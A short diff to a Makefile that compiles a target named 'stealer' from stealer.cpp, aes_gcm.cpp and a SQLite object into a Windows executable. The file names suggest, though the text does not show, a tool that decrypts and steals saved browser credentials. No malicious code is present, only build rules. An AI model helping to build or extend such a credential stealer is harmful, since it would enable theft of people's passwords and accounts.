@@ -12,11 +12,9 @@ endif
 all: stealer
 
 # run sqlite3 before 
-stealer:
-	$(CXX)  stealer.cpp   sqlite3.o $(LDFLAGS)
+stealer: stealer.cpp aes_gcm.cpp sqlite3.o
+	$(CXX) -o $@ $^ $(LDFLAGS)
 
-sqlite3:
-	$(CC) -c sqlite3.c
 clean:
 	$(RM) *.exe 
 	$(RM) *.o
